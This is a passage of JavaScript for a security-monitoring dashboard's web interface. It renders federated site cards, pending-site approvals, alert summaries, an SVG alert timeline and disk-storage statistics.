    case 'fleet': loadFleet(); break;
    case 'data': loadEvents(); break;
    case 'detections': loadRules(); loadActions(); break;
    case 'compliance': loadComplianceFrameworks(); loadMitreCoverage(); break;
  }
}

// Listen for hash changes (back/forward navigation)
window.addEventListener('hashchange', function() {
  const hash = window.location.hash.replace('#', '');
  if (_validTabs.includes(hash) && hash !== _activeTab) switchTab(hash);
});

function setHours(h) {
  hours = h;
  document.querySelectorAll('.tabs .tab').forEach(t => t.classList.remove('active'));
  event.target.classList.add('active');
  refreshAll();
}

function severityBadge(s) {
  const cls = {'critical':'critical','high':'high','medium':'medium','low':'low','info':'info'}[s?.toLowerCase()] || 'info';
  return `<span class="badge badge-${cls}">${s||'unknown'}</span>`;
}

function statusBadge(s) {
  const cls = {'staged':'staged','acknowledged':'approved','dismissed':'rejected'}[s] || 'info';
  return `<span class="badge badge-${cls}">${s}</span>`;
}

// Chart tooltip helpers
let _tipEl = null;
function showTip(evt, text) {
  if (!_tipEl) { _tipEl = document.createElement('div'); _tipEl.className = 'chart-tooltip'; document.body.appendChild(_tipEl); }
  _tipEl.textContent = text;
  _tipEl.style.display = 'block';
  _tipEl.style.left = (evt.pageX + 10) + 'px';
  _tipEl.style.top = (evt.pageY - 28) + 'px';
}
function hideTip() { if (_tipEl) _tipEl.style.display = 'none'; }

let _initialLoadComplete = false;

async function fetchJSON(path) {
  const maxRetries = _initialLoadComplete ? 0 : 2;
  for (let attempt = 0; attempt <= maxRetries; attempt++) {
    try {
      const opts = {};
      if (_authToken) { opts.headers = { 'Authorization': 'Bearer ' + _authToken }; }
      const r = await fetch(BASE + path, opts);
      if (r.status === 401) {
        return { error: 'unauthorized' };
      }
      return await r.json();
    } catch(e) {
      if (attempt < maxRetries) {
        await new Promise(res => setTimeout(res, 2000));
        continue;
      }
      const msg = _initialLoadComplete ? e.message : 'Loading...';
      return { error: msg };
    }
  }
}

// ── Sites tab (Phase 18 M1 — enriched with operational data) ──
let _sitesVisible = false;
let _sitesCache = null;  // cached /api/nodes response for aggregate banner
let _focusedSite = null; // Phase 18 M3: currently focused site node_id (null = all-sites view)
let _localNodeId = null; // Phase 20: local node ID for single-node site focus bypass

async function loadSites() {
  loadPendingSites();  // Phase 21: refresh pending approvals
  const grid = document.getElementById('sitesGrid');
  const countEl = document.getElementById('sitesCount');
  const d = await fetchJSON('/api/nodes');
  _sitesCache = d;  // cache for aggregate banner
  if (d.error && !d.nodes) { grid.innerHTML = '<div class="empty">' + escapeHtml(d.error) + '</div>'; return; }
  const nodes = d.nodes || [];
  const addBtn = document.getElementById('addSiteBtn');
  if (!nodes.length) {
    countEl.textContent = '';
    if (addBtn) addBtn.style.display = 'none';
    grid.innerHTML = '<div class="empty" style="padding:3rem 1rem;text-align:center;display:flex;flex-direction:column;align-items:center;gap:12px"><div style="font-size:14px;color:var(--muted)">No remote sites configured</div><button onclick="showAddSiteForm()" style="padding:8px 20px;border-radius:6px;background:var(--accent);color:#fff;border:none;cursor:pointer;font-size:13px">+ Add your first site</button></div>';
    return;
  }
  countEl.textContent = nodes.length + ' site' + (nodes.length !== 1 ? 's' : '');
  if (addBtn) addBtn.style.display = '';

  // Sort: critical alerts first, then total alerts desc, then alphabetically
  nodes.sort(function(a, b) {
    const ac = a.alerts_critical || 0, bc = b.alerts_critical || 0;
    if (ac !== bc) return bc - ac;
    const at = a.alerts_24h || 0, bt = b.alerts_24h || 0;
    if (at !== bt) return bt - at;
    return (a.node_id || '').localeCompare(b.node_id || '');
  });

  // Build aggregate banner into dedicated container (prevents duplication)
  // Hide the overview-agg-banner to prevent two banners showing simultaneously
  const overviewAgg = document.getElementById('overview-agg-banner');
  if (overviewAgg) overviewAgg.style.display = 'none';
  const agg = d.aggregate;
  const aggContainer = document.getElementById('sitesAggBanner');
  if (aggContainer) {
    if (agg) {
      let aggHtml = '<div class="sites-aggregate" onclick="switchTab(\\'overview\\')">';
      aggHtml += '<span class="agg-val">' + nodes.length + ' site' + (nodes.length !== 1 ? 's' : '') + '</span>';
      aggHtml += '<span class="agg-sep">&middot;</span>';
      aggHtml += '<span class="agg-val">' + (agg.total_alerts_24h || 0) + ' alerts</span>';
      if (agg.total_critical > 0) {
        aggHtml += '<span class="agg-sep">&middot;</span>';
        aggHtml += '<span class="agg-crit">' + agg.total_critical + ' critical</span>';
      }
      if (agg.total_high > 0) {
        aggHtml += '<span class="agg-sep">&middot;</span>';
        aggHtml += '<span style="color:#e67e22;font-weight:600">' + agg.total_high + ' high</span>';
      }
      if (agg.total_medium > 0) {
        aggHtml += '<span class="agg-sep">&middot;</span>';
        aggHtml += '<span style="color:#e67e22">' + agg.total_medium + ' medium</span>';
      }
      if (agg.total_low > 0) {
        aggHtml += '<span class="agg-sep">&middot;</span>';
        aggHtml += '<span style="color:#f1c40f">' + agg.total_low + ' low</span>';
      }
      aggHtml += '<span class="agg-sep">&middot;</span>';
      aggHtml += '<span class="agg-val">' + (agg.total_hosts || 0) + ' hosts</span>';
      if (agg.sites_unreachable > 0) {
        aggHtml += '<span class="agg-sep">&middot;</span>';
        aggHtml += '<span style="color:#ef4444;font-weight:600">' + agg.sites_unreachable + ' unreachable</span>';
      }
      aggHtml += '</div>';
      aggContainer.innerHTML = aggHtml;
    } else {
      aggContainer.innerHTML = '';
    }
  }

  // Build site cards
  let html = '';
  for (const n of nodes) {
    const statusCls = n.status || 'unreachable';
    const statusLabel = statusCls.charAt(0).toUpperCase() + statusCls.slice(1);
    const anchorAgo = n.last_anchor_at ? timeAgo(n.last_anchor_at) : 'never';
    const hasCritical = (n.alerts_critical || 0) > 0;
    const hasHigh = (n.alerts_high || 0) > 0;
    const alertCount = n.alerts_24h;
    const badgeCls = alertCount === null ? 'none' : hasCritical ? 'crit' : hasHigh ? 'high' : 'none';
    const badgeVal = alertCount !== null ? alertCount : '—';
    const versionBadge = n.version && n.version !== nodes[0].version
      ? ' <span class="badge badge-medium">outdated</span>' : '';

    // Use node_id as the focus key; fall back to url for unreachable sites
    const focusKey = n.node_id || n.url || '';
    const displayName = n.node_id || n.url || 'Unknown';
    html += '<div class="site-card' + (hasCritical ? ' has-critical' : '') + '" onclick="focusSite(\\'' + escapeHtml(focusKey) + '\\',\\'' + escapeHtml(displayName) + '\\')">';
    html += '<div class="site-card-header">';
    html += '<span class="site-status ' + statusCls + '"></span>';
    html += '<strong style="flex:1">' + escapeHtml(n.node_id || n.url) + '</strong>';
    // Certificate pinning badge
    const certSt = n.cert_status || 'unpinned';
    const isLocalNode = (n.url && /^https?:\/\/(localhost|127\.0\.0\.1)(:|\/|$)/.test(n.url)) || (n.node_id && n.node_id === _localNodeId);
    if (certSt === 'pinned') html += '<span class="cert-badge pinned" title="TLS certificate verified">&#x1f512;</span>';
    else if (certSt === 'mismatch') html += '<span class="cert-badge mismatch" title="SECURITY: Certificate mismatch!">&#x26a0; CERT</span>';
    else if (isLocalNode) html += '<span class="cert-badge local" title="Local node (no pinning needed)">&#x1f512;</span>';
    else if (certSt === 'unpinned') html += '<span class="cert-badge unpinned" title="Certificate not yet pinned">&#x1f513;</span>';

    html += '<span class="site-alert-badge ' + badgeCls + '">' + badgeVal + '</span>';
    html += '<button class="site-remove-btn" onclick="event.stopPropagation();removeSite(\\'' + escapeHtml(n.url || '') + '\\',\\'' + escapeHtml(n.node_id || '') + '\\')" title="Remove site">&times;</button>';
    html += '</div>';

    // Operational data
    html += '<div class="site-ops">';
    if (alertCount !== null) {
      // Severity breakdown line
      let sevParts = [];
      if (n.alerts_critical > 0) sevParts.push('<span class="sev-crit">' + n.alerts_critical + ' critical</span>');
      if (n.alerts_high > 0) sevParts.push('<span class="sev-high">' + n.alerts_high + ' high</span>');
      if (n.alerts_medium > 0) sevParts.push('<span style="color:#e67e22">' + n.alerts_medium + ' medium</span>');
      if (n.alerts_low > 0) sevParts.push('<span style="color:#f1c40f">' + n.alerts_low + ' low</span>');
      const otherCount = alertCount - (n.alerts_critical || 0) - (n.alerts_high || 0) - (n.alerts_medium || 0) - (n.alerts_low || 0);
      if (otherCount > 0) sevParts.push('<span>' + otherCount + ' other</span>');
      if (sevParts.length > 0) {
        html += '<div class="sev-line">' + sevParts.join(' &middot; ') + '</div>';
      } else {
        html += '<div style="color:var(--green)">No alerts</div>';
      }
    } else {
      html += '<div>Alerts: —</div>';
    }
    if (n.host_count !== null) {
      html += '<div>' + n.host_count + ' host' + (n.host_count !== 1 ? 's' : '');
      if (n.total_events_24h !== null) html += ' &middot; ' + (n.total_events_24h || 0).toLocaleString() + ' events (24h)';
      html += '</div>';
    }
    if (n.top_rule) html += '<div>Top rule: <strong>' + escapeHtml(n.top_rule) + '</strong></div>';
    html += '</div>';

    // Infrastructure metrics
    html += '<div class="site-metrics">';
    html += '<div class="site-metric"><span>Status</span><span class="val">' + statusLabel + '</span></div>';
    html += '<div class="site-metric"><span>Version</span><span class="val">' + escapeHtml(n.version || '?') + versionBadge + '</span></div>';
    html += '<div class="site-metric"><span>Ledger seq</span><span class="val">' + (n.ledger_sequence ?? '—') + '</span></div>';
    html += '<div class="site-metric"><span>Last anchor</span><span class="val">' + anchorAgo + '</span></div>';
    html += '</div>';

    if (!n.reachable && n.error) {
      html += '<div class="site-error">' + escapeHtml(n.error) + '</div>';
    }
    html += '</div>';
  }
  grid.innerHTML = html;
}

function showAddSiteForm() {
  document.getElementById('addSiteForm').style.display = 'block';
  document.getElementById('addSiteUrl').value = '';
  document.getElementById('addSiteError').style.display = 'none';
  document.getElementById('addSiteUrl').focus();
}
function hideAddSiteForm() {
  document.getElementById('addSiteForm').style.display = 'none';
}

async function addSite() {
  const input = document.getElementById('addSiteUrl');
  const errEl = document.getElementById('addSiteError');
  const url = input.value.trim();
  if (!url) { errEl.textContent = 'Please enter a URL or IP address.'; errEl.style.display = 'block'; return; }
  errEl.style.display = 'none';
  try {
    const resp = await fetch('/api/nodes/add', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({url: url, token: _authToken || ''})
    });
    const data = await resp.json();
    if (!resp.ok || data.error) {
      errEl.textContent = data.error || 'Failed to add site.';
      errEl.style.display = 'block';
      return;
    }
    hideAddSiteForm();
    await loadSites();
    // Show Sites tab in nav if it was hidden
    initSitesTab();
  } catch (e) {
    errEl.textContent = 'Network error: ' + e.message;
    errEl.style.display = 'block';
  }
}

async function removeSite(siteUrl, siteName) {
  if (!confirm('Remove site "' + (siteName || siteUrl) + '" from federation?')) return;
  try {
    const resp = await fetch('/api/nodes/remove', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({url: siteUrl, token: _authToken || ''})
    });
    const data = await resp.json();
    if (resp.ok && data.ok) {
      await loadSites();
      initSitesTab();
    }
  } catch (e) {
    console.error('removeSite failed:', e);
  }
}

// Phase 21: Pending site approvals
async function loadPendingSites() {
  const banner = document.getElementById('pendingSitesBanner');
  if (!banner) return;
  try {
    const resp = await fetch(BASE + '/api/nodes/pending', {headers: {'Authorization': 'Bearer ' + (_authToken || '')}});
    if (!resp.ok) {
      banner.style.display = 'none'; return;
    }
    const data = await resp.json();
    const pending = data.pending || [];
    if (!pending.length) { banner.style.display = 'none'; return; }
    const pendingOk = pending.filter(s => s.status === 'pending');
    const authFailed = pending.filter(s => s.status === 'auth_failed');
    let html = '';
    // Show auth failures prominently in red
    if (authFailed.length) {
      html += '<div style="padding:14px 16px;border:1px solid #ef4444;border-radius:8px;background:rgba(239,68,68,0.1);margin-bottom:8px">';
      html += '<div style="display:flex;align-items:center;gap:8px;margin-bottom:10px">';
      html += '<span style="font-size:16px">&#10060;</span>';
      html += '<strong style="color:#ef4444">' + authFailed.length + ' site' + (authFailed.length !== 1 ? 's' : '') + ' failed authentication</strong>';
      html += '</div>';
      for (const s of authFailed) {
        const ago = s.last_seen ? timeAgo(s.last_seen) : 'just now';
        html += '<div style="display:flex;align-items:center;gap:12px;padding:8px 10px;margin-bottom:4px;background:var(--card-bg);border-radius:6px;border:1px solid #ef4444">';
        html += '<div style="flex:1">';
        html += '<strong style="color:var(--fg)">' + escapeHtml(s.node_id) + '</strong>';
        html += '<span style="color:var(--muted);font-size:12px;margin-left:8px">' + escapeHtml(s.url) + '</span>';
        html += '<div style="color:#ef4444;font-size:12px;margin-top:4px">' + escapeHtml(s.error || 'Authentication failed') + '</div>';
        html += '<span style="color:var(--muted);font-size:11px">last attempt ' + ago + '</span>';
        html += '</div>';
        html += '<button onclick="dismissFailedSite(&quot;' + escapeHtml(s.node_id) + '&quot;)" style="padding:4px 14px;border-radius:4px;background:transparent;color:var(--muted);border:1px solid var(--border);cursor:pointer;font-size:12px">Dismiss</button>';
        html += '</div>';
      }
      html += '</div>';
    }
    // Show pending approvals in amber
    if (pendingOk.length) {
      html += '<div style="padding:14px 16px;border:1px solid #b8860b;border-radius:8px;background:rgba(184,134,11,0.12)">';
      html += '<div style="display:flex;align-items:center;gap:8px;margin-bottom:10px">';
      html += '<span style="font-size:16px">&#9888;</span>';
      html += '<strong style="color:#daa520">' + pendingOk.length + ' site' + (pendingOk.length !== 1 ? 's' : '') + ' waiting for approval</strong>';
      html += '</div>';
      for (const s of pendingOk) {
        const ago = s.last_seen ? timeAgo(s.last_seen) : 'just now';
        html += '<div style="display:flex;align-items:center;gap:12px;padding:8px 10px;margin-bottom:4px;background:var(--card-bg);border-radius:6px;border:1px solid var(--border)">';
        html += '<div style="flex:1">';
        html += '<strong style="color:var(--fg)">' + escapeHtml(s.node_id) + '</strong>';
        html += '<span style="color:var(--muted);font-size:12px;margin-left:8px">' + escapeHtml(s.url) + '</span>';
        html += '<span style="color:var(--muted);font-size:12px;margin-left:8px">v' + escapeHtml(s.version || '?') + '</span>';
        html += '<span style="color:var(--muted);font-size:11px;margin-left:8px">last seen ' + ago + '</span>';
        html += '</div>';
        html += '<button onclick="approveSite(&quot;' + escapeHtml(s.node_id) + '&quot;)" style="padding:4px 14px;border-radius:4px;background:#22c55e;color:#fff;border:none;cursor:pointer;font-size:12px;font-weight:600">Approve</button>';
        html += '<button onclick="rejectSite(&quot;' + escapeHtml(s.node_id) + '&quot;)" style="padding:4px 14px;border-radius:4px;background:#ef4444;color:#fff;border:none;cursor:pointer;font-size:12px;font-weight:600">Reject</button>';
        html += '</div>';
      }
      html += '</div>';
    }
    banner.innerHTML = html;
    banner.style.display = 'block';
  } catch (e) {
    banner.style.display = 'none';
  }
}

async function approveSite(nodeId) {
  // Show connecting feedback immediately
  const banner = document.getElementById('pendingSitesBanner');
  if (banner) {
    banner.innerHTML = '<div style="padding:14px 16px;border:1px solid #22c55e;border-radius:8px;background:rgba(34,197,94,0.1);color:#22c55e;font-weight:600">' +
      'Approved &mdash; connecting to ' + escapeHtml(nodeId) + '&hellip; This may take a moment.' +
      '</div>';
  }
  try {
    const resp = await fetch(BASE + '/api/nodes/approve', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({node_id: nodeId, token: _authToken || ''})
    });
    const data = await resp.json();
    if (resp.ok && data.ok) {
      // Brief delay to let the new site become reachable before refreshing
      await new Promise(r => setTimeout(r, 2000));
      await loadPendingSites();
      await loadSites();
      initSitesTab();
    } else {
      if (banner) banner.innerHTML = '<div style="padding:14px 16px;border:1px solid #ef4444;border-radius:8px;background:rgba(239,68,68,0.1);color:#ef4444">Approval failed: ' + escapeHtml(data.error || 'unknown error') + '</div>';
    }
  } catch (e) {
    console.error('approveSite failed:', e);
    if (banner) banner.innerHTML = '<div style="padding:14px 16px;border:1px solid #ef4444;border-radius:8px;background:rgba(239,68,68,0.1);color:#ef4444">Approval failed: ' + escapeHtml(e.message) + '</div>';
  }
}

async function rejectSite(nodeId) {
  if (!confirm('Reject site "' + nodeId + '"? It will stop trying to register.')) return;
  try {
    const resp = await fetch(BASE + '/api/nodes/reject', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({node_id: nodeId, token: _authToken || ''})
    });
    const data = await resp.json();
    if (resp.ok && data.ok) {
      await loadPendingSites();
    }
  } catch (e) {
    console.error('rejectSite failed:', e);
  }
}

async function dismissFailedSite(nodeId) {
  try {
    const resp = await fetch(BASE + '/api/nodes/reject', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({node_id: nodeId, token: _authToken || ''})
    });
    if (resp.ok) await loadPendingSites();
  } catch (e) {
    console.error('dismissFailedSite failed:', e);
  }
}

function apiBase() {
  // Phase 18 M3: returns the API base path for data queries.
  // In focused mode, routes through the site proxy; otherwise uses local API.
  // Phase 20: bypass proxy when focused site is the local node (single-node setup).
  if (_focusedSite && _focusedSite !== _localNodeId) {
    return '/api/site/' + encodeURIComponent(_focusedSite);
  }
  return '/api';
}

function focusedHostname() {
  // Returns the hostname to filter by when focused on the local site, or null.
  return (_focusedSite && _focusedSite === _localNodeId) ? _focusedSite : null;
}

function focusSite(nodeId, displayName) {
  if (_focusedSite === nodeId) return;  // already focused
  _focusedSite = nodeId;
  const name = displayName || nodeId || 'Unknown';
  try { sessionStorage.setItem('tinysocs_focused_site', nodeId); sessionStorage.setItem('tinysocs_focused_name', name); } catch(e) {}
  // Show the site focus banner
  const banner = document.getElementById('siteFocusBanner');
  if (banner) { banner.classList.add('visible'); }
  const label = document.getElementById('sfbSiteName');
  if (label) { label.textContent = 'Viewing: ' + name; }
  // Hide the overview aggregate banner (we're viewing one site, not all)
  const aggBanner = document.getElementById('overview-agg-banner');
  if (aggBanner) aggBanner.style.display = 'none';
  // Reset tab data cache so widgets re-fetch from the focused site
  _tabLoaded = {};
  switchTab('overview');
}

function unfocusSite() {
  _focusedSite = null;
  try { sessionStorage.removeItem('tinysocs_focused_site'); sessionStorage.removeItem('tinysocs_focused_name'); } catch(e) {}
  // Hide the site focus banner
  const banner = document.getElementById('siteFocusBanner');
  if (banner) { banner.classList.remove('visible'); }
  // Reset tab data cache
  _tabLoaded = {};
  switchTab('sites');
}

async function loadOverviewAggregate() {
  // Show cross-site aggregate banner on the Overview tab
  const banner = document.getElementById('overview-agg-banner');
  if (!banner) return;
  if (!_sitesVisible) { banner.style.display = 'none'; return; }

  // Use cached data from Sites tab if available, otherwise fetch
  const d = _sitesCache || await fetchJSON('/api/nodes');
  if (!_sitesCache) _sitesCache = d;
  const agg = d.aggregate;
  const nodes = d.nodes || [];
  if (!agg || !nodes.length) { banner.style.display = 'none'; return; }

  let html = '';
  html += '<span class="agg-val">' + nodes.length + ' site' + (nodes.length !== 1 ? 's' : '') + '</span>';
  html += '<span class="agg-sep">&middot;</span>';
  html += '<span class="agg-val">' + (agg.total_alerts_24h || 0) + ' alerts</span>';
  if (agg.total_critical > 0) {
    html += '<span class="agg-sep">&middot;</span>';
    html += '<span class="agg-crit">' + agg.total_critical + ' critical</span>';
  }
  if (agg.total_high > 0) {
    html += '<span class="agg-sep">&middot;</span>';
    html += '<span style="color:#e67e22;font-weight:600">' + agg.total_high + ' high</span>';
  }
  if (agg.total_medium > 0) {
    html += '<span class="agg-sep">&middot;</span>';
    html += '<span style="color:#e67e22">' + agg.total_medium + ' medium</span>';
  }
  if (agg.total_low > 0) {
    html += '<span class="agg-sep">&middot;</span>';
    html += '<span style="color:#f1c40f">' + agg.total_low + ' low</span>';
  }
  html += '<span class="agg-sep">&middot;</span>';
  html += '<span class="agg-val">' + (agg.total_hosts || 0) + ' hosts</span>';
  if (agg.sites_unreachable > 0) {
    html += '<span class="agg-sep">&middot;</span>';
    html += '<span style="color:#ef4444;font-weight:600">' + agg.sites_unreachable + ' unreachable</span>';
  }
  banner.innerHTML = html;
  // Only show if we're on the overview tab AND not focused on a single site
  // (eager-load may call this from the background while on a different tab).
  banner.style.display = (_activeTab === 'overview' && !_focusedSite) ? '' : 'none';
}

async function initSitesTab() {
  // Sites tab is always visible now (no display:none).
  // Just mark _sitesVisible and pre-cache the nodes data for the aggregate banner.
  _sitesVisible = true;
  if (!_sitesCache) {
    const d = await fetchJSON('/api/nodes');
    _sitesCache = d;
  }
}

async function loadSummary() {
  const el = document.getElementById('summary-content');
  let url = `${apiBase()}/alerts/summary?hours=${hours}`;
  const fh = focusedHostname();
  if (fh) url += `&hostname=${encodeURIComponent(fh)}`;
  const d = await fetchJSON(url);
  if (d.error && !d.severity) { el.innerHTML = `<div class="empty">${d.error}</div>`; return; }

  const total = d.total || 0;
  const sev = d.severity || {};
  const sevOrder = ['critical','high','medium','low','info'];

  let html = '<div class="stat-row"><div class="stat" style="flex:unset;width:100%"><div class="value">' + total + '</div><div class="label">Total Alerts</div></div></div>';
  html += '<div class="stat-row">';
  for (const s of sevOrder) {
    if (sev[s]) html += `<div class="stat"><div class="value" style="color:var(--${s==='critical'?'red':s==='high'?'orange':s==='medium'?'yellow':s==='low'?'blue':'gray'})">${sev[s]}</div><div class="label">${s}</div></div>`;
  }
  html += '</div>';

  if (d.top_hosts?.length) {
    html += '<table><tr><th>Host</th><th>Alerts</th></tr>';
    for (const h of d.top_hosts.slice(0, 5)) html += `<tr><td>${h.host}</td><td>${h.count}</td></tr>`;
    html += '</table>';
  }
  if (total === 0) html += '<div class="empty">All quiet &mdash; no alerts</div>';
  el.innerHTML = html;
}

const SEV_COLORS = {critical:'#e74c3c',high:'#e67e22',medium:'#f1c40f',low:'#3498db',info:'#555'};
const SEV_ORDER = ['critical','high','medium','low','info'];

async function loadTimeline() {
  const el = document.getElementById('timeline-content');
  let tUrl = `${apiBase()}/alerts/timeline?hours=${hours}`;
  const fhT = focusedHostname();
  if (fhT) tUrl += `&hostname=${encodeURIComponent(fhT)}`;
  const d = await fetchJSON(tUrl);
  if (d.error && !d.buckets?.length) { el.innerHTML = `<div class="empty">${d.error}</div>`; return; }

  const buckets = d.buckets || [];
  if (!buckets.length) { el.innerHTML = '<div class="empty">No alerts in period</div>'; return; }

  // Chart dimensions
  const W = 520, H = 200, pad = {top:12, right:12, bottom:36, left:34};
  const plotW = W - pad.left - pad.right;
  const plotH = H - pad.top - pad.bottom;
  const maxCount = Math.max(1, ...buckets.map(b => b.count));
  // Nice Y-axis ticks
  const yTicks = maxCount <= 5 ? Array.from({length:maxCount+1},(_,i)=>i) :
    [0, Math.round(maxCount/4), Math.round(maxCount/2), Math.round(maxCount*3/4), maxCount];
  const barW = Math.max(4, Math.min(24, (plotW / buckets.length) - 2));
  const gap = (plotW - barW * buckets.length) / (buckets.length + 1);

  let svg = `<svg class="chart-svg" viewBox="0 0 ${W} ${H}" preserveAspectRatio="xMidYMid meet">`;

  // Gridlines + Y labels
  for (const t of yTicks) {
    const y = pad.top + plotH - (t / maxCount) * plotH;
    svg += `<line class="grid-line" x1="${pad.left}" y1="${y}" x2="${W-pad.right}" y2="${y}"/>`;
    svg += `<text x="${pad.left-4}" y="${y+3}" text-anchor="end">${t}</text>`;
  }

  // Bars
  const tipId = 'timeline-tip-' + Math.random().toString(36).slice(2,8);
  for (let i = 0; i < buckets.length; i++) {
    const b = buckets[i];
    const x = pad.left + gap + i * (barW + gap);
    const time = b.time ? new Date(b.time).toLocaleTimeString([], {hour:'2-digit',minute:'2-digit'}) : '';

    if (b.count === 0) {
      // Draw a thin baseline tick for empty hours
      const y0 = pad.top + plotH;
      svg += `<rect x="${x}" y="${y0-1}" width="${barW}" height="1" fill="#2a2d3a" rx="0"/>`;
    } else {
      // Stacked bars by severity (bottom-up)
      let yOffset = 0;
      for (const sev of SEV_ORDER) {
        const cnt = (b.severity || {})[sev] || 0;
        if (!cnt) continue;
        const segH = Math.max(2, (cnt / maxCount) * plotH);
        const y = pad.top + plotH - yOffset - segH;
        const color = SEV_COLORS[sev] || SEV_COLORS.info;
        const tip = `${time}: ${cnt} ${sev}`;
        svg += `<rect class="bar-rect" x="${x}" y="${y}" width="${barW}" height="${segH}" fill="${color}" `
            + `data-tip="${escapeHtml(tip)}" onmouseenter="showTip(event,this.dataset.tip)" onmouseleave="hideTip()"/>`;
        yOffset += segH;
      }
      // If severity breakdown missing, draw total as yellow
      if (yOffset === 0) {
        const barH = Math.max(3, (b.count / maxCount) * plotH);
        const y = pad.top + plotH - barH;
        const tip = `${time}: ${b.count} alerts`;
        svg += `<rect class="bar-rect" x="${x}" y="${y}" width="${barW}" height="${barH}" fill="${SEV_COLORS.medium}" `
            + `data-tip="${escapeHtml(tip)}" onmouseenter="showTip(event,this.dataset.tip)" onmouseleave="hideTip()"/>`;
      }
    }

    // X-axis labels (every few hours to avoid crowding)
    const labelEvery = buckets.length <= 12 ? 1 : buckets.length <= 24 ? 3 : 6;
    if (i % labelEvery === 0 || i === buckets.length - 1) {
      const lbl = b.time ? new Date(b.time).toLocaleTimeString([], {hour:'2-digit',minute:'2-digit'}) : '';
      svg += `<text x="${x + barW/2}" y="${H - pad.bottom + 14}" text-anchor="middle">${lbl}</text>`;
    }
  }

  // Baseline
  svg += `<line class="grid-line" x1="${pad.left}" y1="${pad.top+plotH}" x2="${W-pad.right}" y2="${pad.top+plotH}"/>`;
  svg += '</svg>';

  // Legend
  const sevsPresent = new Set();
  for (const b of buckets) for (const s of Object.keys(b.severity||{})) sevsPresent.add(s);
  let legend = '<div class="chart-legend">';
  for (const s of SEV_ORDER) {
    if (!sevsPresent.has(s)) continue;
    legend += `<span style="--c:${SEV_COLORS[s]}"><span style="display:inline-block;width:10px;height:10px;border-radius:2px;background:${SEV_COLORS[s]};margin-right:4px;vertical-align:middle"></span>${s}</span>`;
  }
  if (!sevsPresent.size) legend += '<span style="color:var(--muted)">No severity data</span>';
  legend += '</div>';

  // Tooltip container
  svg += `<div class="chart-tooltip" id="${tipId}"></div>`;

  el.innerHTML = svg + legend;
}

// ---- Storage Widget ----
async function loadStorage() {
  const el = document.getElementById('storage-content');
  if (!el) return;
  const d = await fetchJSON(`${apiBase()}/storage/stats`);
  if (d.error) { el.innerHTML = `<div class="empty">${d.error}</div>`; return; }

  const disk = d.disk || {};
  const idx = d.indices || {};
  const pct = disk.used_percent || 0;
  const barColor = pct >= 85 ? 'var(--red)' : pct >= 70 ? 'var(--orange)' : 'var(--green)';

  let html = '<div style="display:flex;gap:16px;align-items:flex-start">';

  // Left: disk bar
  html += '<div style="flex:1;min-width:120px">';
  html += '<div style="font-size:11px;color:var(--muted);margin-bottom:4px">Disk Usage</div>';
  html += `<div style="background:var(--bg);border-radius:4px;height:18px;overflow:hidden;border:1px solid var(--border)">`;
  html += `<div style="height:100%;width:${Math.min(pct, 100)}%;background:${barColor};border-radius:3px;transition:width 0.3s"></div>`;
  html += '</div>';
  html += `<div style="font-size:12px;margin-top:4px"><strong>${pct}%</strong> used`;
  if (disk.total_human) html += ` &mdash; ${disk.available_human} free of ${disk.total_human}`;
  html += '</div>';
  if (pct >= 85) html += '<div style="font-size:11px;color:var(--red);margin-top:2px">&#x26A0; Disk critically full &mdash; reduce retention or expand storage</div>';
  else if (pct >= 70) html += '<div style="font-size:11px;color:var(--orange);margin-top:2px">&#x26A0; Disk usage elevated</div>';
  html += '</div>';

  // Right: index breakdown
  html += '<div style="flex:1;min-width:180px">';
  html += '<table style="width:100%;font-size:12px;border-collapse:collapse">';
  html += '<tr style="color:var(--muted);font-size:11px"><td>Index</td><td style="text-align:right">Docs</td><td style="text-align:right">Size</td><td style="text-align:right">Retention</td></tr>';
  const rows = [
    ['Event Logs', idx.winlog],
    ['Alerts', idx.alerts],
    ['Custom (HEC)', idx.custom],
    ['Other', idx.other],
  ];
  for (const [label, data] of rows) {
    if (!data) continue;
    const docs = (data.doc_count || 0).toLocaleString();
    const size = data.size_human || '0 B';
    const ret = data.retention_days ? data.retention_days + 'd' : '\u2014';
    html += `<tr><td>${label}</td><td style="text-align:right">${docs}</td><td style="text-align:right">${size}</td><td style="text-align:right">${ret}</td></tr>`;
  }
  if (idx.total) {
    const docs = (idx.total.doc_count || 0).toLocaleString();
    const size = idx.total.size_human || '0 B';
    html += `<tr style="font-weight:600;border-top:1px solid var(--border)"><td>Total</td><td style="text-align:right">${docs}</td><td style="text-align:right">${size}</td><td></td></tr>`;
  }
  html += '</table>';
  html += '</div>';

  html += '</div>';

  // Cluster status badge
  const cs = d.cluster_status || 'unknown';
  const csColor = cs === 'green' ? 'var(--green)' : cs === 'yellow' ? 'var(--orange)' : 'var(--red)';
  html += `<div style="margin-top:6px;font-size:11px;color:var(--muted)">Cluster: <span style="color:${csColor};font-weight:600">${cs}</span></div>`;

  // Auto-purge notice
  if (d.auto_purge && d.auto_purge.triggered) {
    html += `<div style="margin-top:6px;padding:6px 10px;background:rgba(255,165,0,0.1);border:1px solid var(--orange);border-radius:4px;font-size:11px;color:var(--orange)">`;
    html += `&#x26A0; Auto-purge activated &mdash; deleted ${d.auto_purge.deleted.length} oldest event indices (${d.auto_purge.freed_human}) to prevent disk-full lockout`;
    html += `</div>`;
  } else if (pct >= 88) {
    html += `<div style="margin-top:6px;font-size:11px;color:var(--orange)">&#x26A0; Auto-purge is active &mdash; oldest event logs will be removed automatically if disk reaches 88%</div>`;
  }

  // "Free Space Now" button when disk is elevated
  if (pct >= 80) {
    const btnColor = pct >= 85 ? 'var(--red)' : 'var(--orange)';
    html += `<div style="margin-top:8px">`;
    html += `<button id="btn-emergency-purge" onclick="emergencyPurge()" style="padding:4px 14px;font-size:12px;background:${btnColor};color:#fff;border:none;border-radius:4px;cursor:pointer;font-weight:600">Free Space Now</button>`;
    html += `<span id="purge-result" style="margin-left:8px;font-size:11px;color:var(--muted)"></span>`;
    html += `</div>`;
  }

  el.innerHTML = html;
}

async function emergencyPurge() {
  const btn = document.getElementById('btn-emergency-purge');
  const resultEl = document.getElementById('purge-result');
  if (!btn) return;

  const pw = prompt('Enter admin password to free disk space:');
  if (!pw) return;

  btn.disabled = true;
  btn.textContent = 'Purging...';
  if (resultEl) resultEl.textContent = '';

  try {
